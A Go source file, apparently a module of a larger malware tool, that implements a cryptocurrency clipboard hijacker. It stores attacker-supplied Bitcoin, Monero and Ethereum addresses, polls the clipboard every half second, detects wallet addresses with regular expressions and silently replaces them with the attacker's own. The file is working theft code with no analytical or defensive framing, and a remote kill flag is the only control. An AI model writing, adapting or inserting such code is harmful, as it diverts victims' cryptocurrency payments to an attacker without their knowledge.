package commands

import (
	"regexp"
	"strings"
	"time"

	"github.com/atotto/clipboard"
)

var btc_add = ""
var xmr_add = ""
var eth_add = ""

func SetAddr(addr string) {
	addrs := strings.Split(addr, "|")
	for _, s := range addrs {
		a := strings.Split(s, ":")
		switch strings.ToLower(a[0]) {
		case "btc":
			btc_add = a[1]
		case "xmr":
			xmr_add = a[1]
		case "eth":
			eth_add = a[1]
		}
	}
}

func validateAdd(add string) (bool, string) {
	var cryptoRe = map[string]string{
		"btc": "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",
		"xmr": "^4([0-9]|[A-B])(.){93}$",
		"eth": "^(0x)[a-zA-Z0-9]{40}$",
	}
	for crypto, regex := range cryptoRe {
		re := regexp.MustCompile(regex)
		match := re.MatchString(add)
		if match {
			return match, crypto
		}
	}
	return false, ""
}

func loop() {
	clip, _ := clipboard.ReadAll()
	match, crypto := validateAdd(clip)
	if match {
		if crypto == "btc" {
			clipboard.WriteAll(btc_add)
		} else if crypto == "xmr" {
			clipboard.WriteAll(xmr_add)
		} else if crypto == "eth" {
			clipboard.WriteAll(eth_add)
		}
	}
}

var Kill bool = false

func StartClip() {
	for {
		if !Kill {
			loop()
			time.Sleep(time.Duration(500) * time.Millisecond)
		}
	}
}
